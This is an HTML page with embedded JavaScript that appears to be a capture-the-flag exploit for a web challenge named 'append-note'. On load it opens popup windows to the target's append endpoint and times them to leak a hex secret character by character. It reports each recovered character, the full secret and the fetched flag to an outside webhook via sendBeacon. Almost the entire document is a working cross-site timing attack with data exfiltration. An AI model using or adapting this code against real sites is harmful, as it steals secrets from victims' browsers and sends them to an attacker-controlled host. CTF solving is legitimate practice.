<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Append-Note: Final Strike</title>
    <style>
        body { background: #0d1117; color: #c9d1d9; font-family: 'Courier New', monospace; padding: 20px; }
        #status { font-size: 20px; color: #58a6ff; margin-bottom: 10px; border-bottom: 1px solid #30363d; }
        #log { background: #010409; padding: 10px; height: 300px; overflow-y: auto; border: 1px solid #30363d; font-size: 13px; }
        .win { color: #3fb950; font-weight: bold; }
        .sys { color: #8b949e; }
    </style>
</head>
<body>
    <div id="status">System Initializing...</div>
    <div id="log"></div>

<script>
    const TARGET = "https://append-note-61jaz.instancer.lac.tf/";
    const WEBHOOK = "https://bbote0qi0v6t4dwpqhu8mm6qzrudvnz0i.oast.site";
    const CHARS = "0123456789abcdef";
    
    // Performance Tunables
    const MAX_WAIT = 250; // Max time to wait for a window to load
    const SAMPLES = 1;    // Speed over accuracy for the 60s bot

    const log = (m, c="") => {
        const d = document.createElement("div");
        if(c) d.className = c;
        d.textContent = `[${new Date().toLocaleTimeString()}] ${m}`;
        document.getElementById("log").appendChild(d);
        document.getElementById("log").scrollTop = 1e9;
    };

    const report = (data) => {
        navigator.sendBeacon(WEBHOOK, JSON.stringify(data));
    };

    const sleep = (ms) => new Promise(r => setTimeout(r, ms));

    async function probe(prefix) {
        const url = `${TARGET}/append?content=${encodeURIComponent(prefix)}&url=${encodeURIComponent(window.location.href)}`;
        return new Promise((resolve) => {
            const t0 = performance.now();
            const w = window.open(url, "_blank", "width=10,height=10");
            
            let timer = setTimeout(() => {
                if(w) w.close();
                resolve(performance.now() - t0);
            }, MAX_WAIT);

            // If we can catch the load event, we get a tighter measurement
            try {
                w.onload = () => {
                    clearTimeout(timer);
                    const dur = performance.now() - t0;
                    w.close();
                    resolve(dur);
                };
            } catch(e) {}
        });
    }

    async function run() {
        log("Phase 1: Calibrating Sensors...", "sys");
        const base404 = await probe("non_existent_prefix_" + Math.random());
        report({ event: "boot", base_latency: base404 });

        let secret = "";
        log("Phase 2: Initiating Brute Force...", "sys");

        for (let i = 0; i < 8; i++) {
            let bestChar = "";
            let minTime = 9999;
            
            document.getElementById("status").textContent = `Cracking Pos ${i+1}: ${secret}...`;

            for (const c of CHARS) {
                const time = await probe(secret + c);
                log(`Trying ${c}: ${time.toFixed(2)}ms`);

                if (time < minTime) {
                    minTime = time;
                    bestChar = c;
                }
            }

            // Confirmation Step: Quickly verify the winner before committing
            log(`Found Candidate: ${bestChar}. Verifying...`, "sys");
            const verify = await probe(secret + bestChar);
            
            if (verify <= minTime + 5) { // Within a 5ms tolerance
                secret += bestChar;
                log(`Confirmed: ${bestChar}`, "win");
                report({ pos: i, char: bestChar, current_secret: secret });
            } else {
                log(`Noise detected for ${bestChar}. Retrying...`, "sys");
                i--; // Step back and retry the position
            }
        }

        log(`Full Secret Acquired: ${secret}`, "win");
        report({ event: "success", final_secret: secret });
        
        // Attempt to grab flag
        const res = await fetch(`${TARGET}/flag?secret=${secret}`);
        const flag = await res.text();
        log(`FLAG: ${flag}`, "win");
        report({ flag: flag });
        document.getElementById("status").textContent = "MISSION ACCOMPLISHED";
    }

    // Start on load
    window.onload = () => {
        log("Vitals Check: OK. Bypassing Proxies...");
        run();
    };
</script>
</body>
</html>
